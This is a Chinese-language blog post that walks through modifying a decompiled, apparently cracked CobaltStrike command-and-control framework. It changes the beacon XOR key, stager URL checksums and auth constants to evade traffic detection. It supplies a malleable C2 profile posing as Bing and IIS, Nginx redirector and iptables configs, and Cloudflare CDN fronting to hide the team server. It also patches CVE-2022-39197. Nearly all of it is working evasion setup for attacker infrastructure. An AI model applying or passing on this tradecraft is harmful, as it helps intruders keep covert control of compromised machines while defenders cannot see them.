---
layout: post
title: "CobaltStrike魔改"
subtitle: '夫唯不争,故无尤.'
author: "mangxieke"
header-style: text
tags:
  - CobaltStrike
  - C2
  - 二开
---

{% raw %}

## 简述

本文章介绍了如何搭建CobaltStrike的二开环境以及一些二开的点,以来记录下曾经的记忆.

## 环境准备

### 下载安装IntelliJ IDEA与JDK8

> 从官网下载IntelliJ IDEA工具与JDK8,然后分别安装.IntelliJ IDEA试用期到了的话,建议闲鱼上买一个激活码,最为方便与节约时间.

### 反编译源码

> 在IntelliJ IDEA安装目录找到java-decompiler.jar文件,用这个工具对CobaltStrike原始jar包进行反编译,

```
java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true cobaltstrike.jar decompiled_src/
```

### 创建Java项目

> 打开IDEA选择Create New Project,一直选择Next,创建好后,把之前反编译得到的decompiled_src文件夹复制到项目中,之后再建立一个lib文件夹,把原始的CobaltStrike原始jar包放到这个目录中,最后项目结构如下图:

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/1.png)

> 对这个项目进行设置,点击文件中的项目结构,点击模块,新建一个名为cobaltstrike的模块,JDK选择1.8(必须是这个版本),再对依赖进行设置.

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/2.png)

> 依赖新添加一个,选择1 JAR或目录,选择之前建立的lib目录中的CobaltStrike原始jar包,点击确认

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/3.png)

> 在工件中,新建一个工件,JAR->从具有依赖性的模块

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/4.png)

> 这里需要填写一个Main Class,去lib中的META-INF里面双击MANIFEST.MF,复制aggressor.Aggressor,再次打开输入后点击确定就行.

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/5.png)

> 接下来在decompiled_src中找到已经反编译完的aggressor主类,右键选择重构–复制文件,在到目录点击添加,选择之前创建的src文件夹,在其中新建一个aggressor,名字要一致,这样aggressor就自动的被拷贝到src目录里去了.

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/6.png)

> 到这里基本的准备工作就完成了,之后需要修改哪个文件,就可以在完整的源码中找到那个文件,然后右键选择重构后然复制文件到这个目录进行修改,修改完成之后就可以选构建–>构建共建–>构建进行编译即可,最终编译后就会在out/artifacts/cobaltstrike_jar目录下生成一个名为cobaltstrike.jar文件.

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/7.png)

## 二开

### 防爆破

> 找到ssl/SecureServerSocket.java中的authenticate函数,接下来的事就比较好办了,只要全局搜索这个48879然后同时替换成某个int即可.但是要注意不要修改dns/AsymmetricCrypto.java里面的(这个和beacon回连认证有关),修改之后编译下,cobaltstrike即便是弱口令也不会被爆破出来了.

### 修改xor密钥

> 修改beacon/BeaconPayload.java中的beacon_obfuscate函数里面的0x2E为一个任意的数字即可,除此之外还要修改一些dll文件(在sleeve文件夹中),这些dll文件使用这个密钥加密的,参考https://github.com/jas502n/cs_file_decrypt,需要注意的是对于4.4,还需要修改CrackSleeve.java内置的密钥.

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/8.png)

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/9.png)

```
private static byte[] OriginKey = {94, -104, 25, 74, 1, -58, -76, -113, -91, -126, -90, -87, -4, -69, -110, -42};
```

> 要修改的dll文件有beacon.dll、beacon.x64.dll、dnsb.dll、dnsb.x64.dll、pivot.dll、pivot.x64.dll、extc2.dll、extc2.x64.dll.使用010 Editor把这些dll中的0x2E改为前面修改的数字,然后运行下面的命令把dll加密回去

```
java -cp cobaltstrike.jar:. CrackSleeve encode 5e98194a01c6b48fa582a6a9fcbb92d6
```

> 最后将Encode文件夹里面的所有dll文件放在sleeve文件夹中进行jar包的编译.

### 修改stager下载路径

> 很对流量检测设备会根据请求stager下载路径的特征来判断是不是请求恶意文件的,默认这个路径是由4个字母组成,并且默认64位stager请求url检验和是93,32位为92.可以修改路径由6个字母组成,并把92、93的特征修改掉.

> common/CommonUtils.java文件修改MSFURI和MSFURI_X64函数,这里可以任意修改,只要对应上就行,这里修改长度为6,检验和分别为78和79.

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/10.png)

> cloudstrike/WebServer.java修改isStager和isStagerX64、isStagerStrict、isStagerX64Strict函数

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/11.png)

### 修复CVE-2022-39197漏洞

> 攻击者通过设置假用户名(比如<html><img src='file://192.168.135.15/netntlm'%>),会触发XSS漏洞,进而在CS Server上造成远程代码执行.修复方法是在cloudstrike/WebServer.java里面的_serve函数中合适位置加上对uri开头字符的判断.

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/12.png)

```
if (!uri.startsWith("/")) {
    return this.processResponse(uri, method, header, param, false, null, new Response("400 Bad Request", "text/plain", ""));
}
```

## 其他隐藏流量方法

### 自定义证书

> CobaltStrike默认使用的证书早已被标记,可以自己买一个域名,设置DNS纪录后,使用certbot申请一个Let's Encrypt免费证书即可,然后用openssl和keytool生成CobaltStrike用到的证书.

> 从https://github.com/certbot/certbot官方地址中通过介绍安装certbot,也可以百度或谷歌如何安装.

> 在godaddy上购买一个域名,然后添加一个A记录,地址指向CobaltStrike服务所在机器IP

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/13.png)

> 然后使用下面的指令生成证书,假设申请的域名为test.wiki

```
certbot certonly --standalone -d test.wiki -d www.test.wiki -d m.test.wiki

openssl pkcs12 -export -in /etc/letsencrypt/live/test.wiki/fullchain.pem -inkey /etc/letsencrypt/live/test.wiki/privkey.pem -out test.wiki.p12 -name test.wiki -passout pass:123456

keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore test.wiki.store -srckeystore test.wiki.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias test.wiki
```

> 然后修改teamserver中最后一行的内容

```
java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=43285 -Dcobaltstrike.server_bindto=0.0.0.0 -Djavax.net.ssl.keyStore=./test.wiki.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar -javaagent:CSAgent.jar=5e98194a01c6b48fa582a6a9fcbb92d6 -Duser.language=en server.TeamServer $*
```

### Nginx转发

> 通过自定义profile文件+Nginx转发CobaltStrike数据包+iptables规则可以把监听器隐藏在背后,这样别人就算发现了攻击,会发现我们的CS服务器只开放了80、443端口,一定程度上保护了真正的CS服务.

> profile文件:

```
#替代默认ssl.store证书,自签ssl证书
https-certificate {
	# 使用真实有效的SSL证书则只需用keystore和password
	# set keystore "密钥库文件";
	# set password "密码库文件密码"
    set keystore "test.wiki.store";
    set password "123456";
	# set CN       "www.baidu.com";
	# set O        "Microsoft Corporation";
	# set C        "US";
	# set L        "Redmond";
	# set OU       "Microsoft IT";
	# set ST       "WA";
	# set validity "365";
}

# 表明这是默认的 Beacon 配置文件
set sample_name "New Bing";
# 设置睡眠时间为 60000 (默认为 60 秒)
set sleeptime "3000";
# 默认回连的抖动因子 0-99% [随机化回调时间]
set jitter "0";
# 设置每次发送请求的用户代理UA
set useragent "Mozilla/5.0 (Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
set pipename "qax";
set pipename_stager "qax";

stage {
	# 要求 Beacon 尝试释放与初始化它的反射 DLL 包关联的内存
	set cleanup   		"true";
}

http-config{
    set trust_x_forwarded_for "true";
}

# 为HTTP GET定义指标,仅对通信过程中的GET请求有效
http-get {
	# Beacon将从这个URI池中随机选择一个作为通信时使用的URL（如果提供了多个URI）
	set uri "/query";
	set verb "GET";
	# 客户端响应规则
	client {
		#使用header设置http响应头字段
		header "Host" "www.baidu.com";
		header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
		header "Cookie" "UID=74399JdskNSQ79943;";
		# base64 编码会话元数据并将其存储在Cookie标头中
		metadata {
			base64url;
			# 将数据存储在指定的URL参数q中
			parameter "q";
		}
		parameter "go" "Query";
		parameter "qs" "bs";
		parameter "form" "QBRE";
	}
	# 服务端响应规则
	server {
		# 服务端应该发送没有更改的输出
		header "Server" "Microsoft-IIS/10.5";
		header "Cache-Control" "private, max-age=0";
		header "Content-Type" "text/html; charset=utf-8";
		header "Keep-Alive" "timeout=3, max=100";
		header "Connection" "close";
		header "Vary" "Accept-Encoding";
		# 通过output代码块设置返回数据的编码规则
		output {
			base64;
            prepend "test";
            append "test";
            print;
		}
	}
}
# 为HTTP POST定义指标,仅对通信过程中的POST请求有效
http-post {
	# 同上,Beacon会从这个URI池中随机选择一个作为通信时使用的URL（如果提供了多个URI）
	set uri "/Query";
	set verb "POST";
	client {
		header "Host" "www.baidu.com";
		header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
		header "Cookie" "UID=74399JdskNSQ79943;";
		# 任务id由此代码块控制
		id {
			base64url;
			parameter "form";
		}
		parameter "go" "Query";
		parameter "qs" "bs";
		output {
			base64url;
			print;
		}
	}
	# 服务端对 HTTP POST 的响应
	server {
		header "Cache-Control" "no-cache";
		header "Keep-Alive" "timeout=3, max=100";
		header "Cache-Control" "private, max-age=0";
		header "Content-Type" "text/html; charset=utf-8";
		header "Vary" "Accept-Encoding";
		header "Server" "Microsoft-IIS/8.5";
		header "Connection" "close";
		output {
			netbios;
			base64;
			prepend "test";
			append "test";
			print;
		}
	}
}
# 此代码块用来控制stage（Beacon核心代码）发送过程
http-stager {
	set uri_x86 "/random";
	set uri_x64 "/Random";
	client {
		header "Accept" "*/*";
    	}
	server {
		header "Cache-Control" "private, max-age=0";
        	header "Content-Type" "text/html; charset=utf-8";
        	header "Vary" "Accept-Encoding";
        	header "Server" "Microsoft-IIS/8.5";
        	header "Connection" "close";
    	}
}
```

> Nginx配置,nginx.conf

```
user  nginx;
worker_processes  5;

error_log  /var/log/nginx/error.log warn; #访问出错后产生的日志存放路径
pid        /var/run/nginx.pid;


events {
    worker_connections 65535;
}


http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;
    proxy_max_temp_file_size 0;
    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    access_log  /var/log/nginx/access.log  main; #访问这个端口的日志文件存放路径

    sendfile        on;
    #tcp_nopush     on;

    keepalive_timeout  65;
    #gzip  on;

    include /etc/nginx/conf.d/*.conf;
}
```

> Nginx配置,conf.d/http.conf

```
server {
    listen       80; #vue使用的端口
    server_name  localhost;

    #charset koi8-r;
    #access_log  /var/log/nginx/host.access.log  main;

    location / {
        root   /usr/share/nginx/html/; #vue文件的路径,即vue打包后的文件存放处
        try_files $uri $uri/ /index.html last;
        index  index.html index.htm;
    }
    
    location /Query {
        if ( $http_user_agent != "Mozilla/5.0 (Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
        {
            return 404;
        }
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_pass http://127.0.0.1:48751/Query;
    }
    
    location /query {
        if ( $http_user_agent != "Mozilla/5.0 (Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
        {
            return 404;
        }
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_pass http://127.0.0.1:48751/query;
    }
    
    location /Random {
        if ( $http_user_agent != "Mozilla/5.0 (Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
        {
            return 404;
        }
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_pass http://127.0.0.1:48751/Random;
    }
    
    location /random {
        if ( $http_user_agent != "Mozilla/5.0 (Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
        {
            return 404;
        }
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_pass http://127.0.0.1:48751/random;
    }

    #error_page  404              /404.html;

    # redirect server error pages to the static page /50x.html
    #
    error_page   500 502 503 504  /50x.html;
    
    location = /50x.html {
        root   /usr/share/nginx/html;
    }

}
```

> Nginx配置,conf.d/https.conf

```
server {
    listen 443 ssl;
    listen [::]:443 ssl;
    ssl on;
    ssl_certificate /etc/letsencrypt/live/test.wiki/fullchain.pem; # managed by Certbot
    ssl_certificate_key /etc/letsencrypt/live/test.wiki/privkey.pem; # managed by Certbot
    ssl_session_cache shared:le_nginx_SSL:1m; # managed by Certbot
    ssl_session_timeout 1440m; # managed by Certbot
    ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # managed by Certbot
    ssl_prefer_server_ciphers on; # managed by Certbot
    server_name  test.wiki;

    #charset koi8-r;
    #access_log  /var/log/nginx/host.access.log  main;

    location / {
        root   /usr/share/nginx/html/; #vue文件的路径,即vue打包后的文件存放处
        try_files $uri $uri/ /index.html last;
        index  index.html index.htm;
    }
 
    location /Query {
        if ( $http_user_agent != "Mozilla/5.0 (Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
        {
            return 404;
        }
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_pass https://127.0.0.1:4433/Query;
    }
    
    location /query {
        if ( $http_user_agent != "Mozilla/5.0 (Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
        {
            return 404;
        }
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_pass https://127.0.0.1:4433/query;
    }
    
    
    location /Random {
        if ( $http_user_agent != "Mozilla/5.0 (Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
        {
            return 404;
        }
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_pass https://127.0.0.1:4433/Random;
    }
    
    location /random {
        if ( $http_user_agent != "Mozilla/5.0 (Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
        {
            return 404;
        }
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_pass https://127.0.0.1:4433/random;
    }

    #error_page  404              /404.html;

    # redirect server error pages to the static page /50x.html
    #
    error_page   500 502 503 504  /50x.html;
    
    location = /50x.html {
        root   /usr/share/nginx/html;
    }

}
```

> 假设CS开启了2个监听器,1个是http监听器,监听端口是8080,另一个是https监听器,监听端口为8443,则iptables规则为

```
iptables -A INPUT -s 127.0.0.1 -p tcp --dport 8080 -j ACCEPT

iptables -A INPUT -p tcp --dport 8080 -j DROP

iptables -A INPUT -s 127.0.0.1 -p tcp --dport 8443 -j ACCEPT

iptables -A INPUT -p tcp --dport 8443 -j DROP
```

### CDN+证书申请

> 即使使用Nginx转发流量,但还是会泄漏IP地址,可以使用cloudflare免费的CDN和证书隐藏IP和流量.

> 在这里输入我们之前购买的域名,点击继续,在页面里选择免费的方案即可,然后DNS的记录cloudflare都已获取到

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/14.png)

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/15.png)

> 点击继续,就会提示需要在godaddy中把域名的名称服务器切换为cloudflare的域名服务器

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/16.png)

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/17.png)

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/18.png)

> 切换完成后,点击继续就完成了,然后在下面选择检测nameserver,等待几小时(其实不到半小时就好了)cloudflare检测到更改完成就可以了.然后在缓存里打开开发者模式

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/19.png)

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/20.png)

> 然后设置证书模式并生成cloudflare证书,使用默认配置创建即可.

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/21.png)

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/22.png)

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/23.png)

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/24.png)

> 把生成的证书和私钥内容分别保存下来,然后就像上面自定义证书时用openssl和keytool生成CS的证书.

![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/25.png)

```
openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem -out test.wiki.p12 -name test.wiki -passout pass:123456

keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore test.wiki.store -srckeystore test.wiki.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias test.wiki
```

## 总结

> 以上的魔改CobaltStrike和流量隐藏方法能够有一定的作用,但是还是无法能够完全躲避安全设备的检测,还需要一个强大的loader来躲避安全设备的检测.

{% endraw %}